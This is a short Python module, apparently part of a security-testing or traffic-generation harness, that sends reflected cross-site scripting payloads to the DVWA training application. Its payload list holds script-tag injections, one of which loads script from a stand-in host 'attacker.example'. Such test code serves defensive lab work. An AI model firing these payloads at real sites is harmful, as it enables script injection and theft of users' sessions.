"""Reflected XSS against DVWA: one GET with a script-tag test string in the `name` parameter per step."""
import requests

ATTACK_TYPE = "xss"
DEFAULT_RATE = 1.0

PAYLOADS = ["<script>alert(1)</script>", "<script>alert('xss')</script>",
            "<script>document.cookie</script>", "\"><script>alert(document.domain)</script>",
            "<script src=http://attacker.example/x.js></script>"]


def step(ctx):
    base = ctx.targets["dvwa"]
    requests.get(f"{base}/vulnerabilities/xss_r/",
                 params={"name": ctx.rng.choice(PAYLOADS)},
                 cookies={"security": "low"}, timeout=ctx.timeout)
